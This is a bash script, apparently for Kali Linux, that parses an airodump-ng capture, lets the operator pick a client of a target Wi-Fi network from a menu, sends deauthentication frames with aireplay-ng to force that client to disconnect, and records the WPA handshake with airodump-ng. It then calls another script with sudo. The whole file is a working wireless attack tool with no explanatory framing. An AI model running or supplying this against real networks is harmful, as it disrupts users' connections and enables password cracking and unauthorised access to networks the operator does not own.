#!/bin/bash
esss="$(cat essid)"
lineNum="$(grep -n "Station" /home/kali/wifi/"$esss"/"$esss"-01.csv | head -n 1 | cut -d: -f1)"
lineNum="$(($lineNum-"2"))"
numbers=( $(cat  "/home/kali/wifi/"$esss"/"$esss"-01.csv" | sed -n 3,"$lineNum"p | awk -F',' '{ print $1 " " $4 " " $9 " " $14}' | cat -n |  awk '{print $1}') )
mac=( $(cat  "/home/kali/wifi/"$esss"/"$esss"-01.csv" | sed -n 3,"$lineNum"p | awk -F',' '{ print $1 " " $4 " " $9 " " $14}' | cat -n |  awk '{print $2}') )
channel=( $(cat  "/home/kali/wifi/"$esss"/"$esss"-01.csv" | sed -n 3,"$lineNum"p | awk -F',' '{ print $1 " " $4 " " $9 " " $14}' | cat -n |  awk '{print $3}') )
essid=( $(cat  "/home/kali/wifi/"$esss"/"$esss"-01.csv" | sed -n 3,"$lineNum"p | awk -F',' '{ print $1 " " $4 " " $9 " " $14}' | cat -n |  awk '{print $5}') )

lineN="$(grep -n "Station" /home/kali/wifi/"$esss"/"$esss"-01.csv | head -n 1 | cut -d: -f1)"
lineN="$(($lineN+"1"))"
clients=( $(cat  "/home/kali/wifi/"$esss"/"$esss"-01.csv" | awk -F',' '{ print $1 " " $4 " " $9 " " $14}' | cat -n |  awk '{print $2}'| tail +$lineN) )
let i=0 # define counting variable
W=() # define working array
while read -r line; do # process file by file
    let i=$i+1
    W+=($i "$line")
done < <(cat  "/home/kali/wifi/"$esss"/"$esss"-01.csv" | awk -F',' '{ print $1 " " $4 " " $9 " " $14}' | cat -n |  awk '{print $2}'| tail +$lineN)
FILE=$(dialog --title "Вибір клієнта" --menu "Chose one" 24 80 17 "${W[@]}" 3>&2 2>&1 1>&3) # show dialog and store output
clear
if [ $? -eq 0 ]; then # Exit with OK
    FILE=$((FILE-1))
    adapter=$(iw dev | awk '$1=="Interface"{print $2}' | grep "mon")
    macc=${mac[0]}
    ess=${essid[0]}
    chn=${channel[0]}
    cl=${clients[$FILE]}
    echo $FILE
    echo $macc
    echo $ess
    echo $chn
    echo $cl
    echo $adapter
    echo "termit -e airodump-ng $adapter --bssid ${mac[0]} -c ${channel[0]} -w /home/kali/wifi/handshake/$esss"
    echo "termit -e aireplay-ng -0 10 -a $macc -c $cl $adapter"
    termit -e aireplay-ng -0 10 -a $macc -c $cl $adapter --ignore-negative-one 
    termit -e airodump-ng $adapter --bssid $macc -c $chn -w /home/kali/wifi/handshake/$esss --ignore-negative-one 
    sudo /home/kali/wifi/come.sh
fi
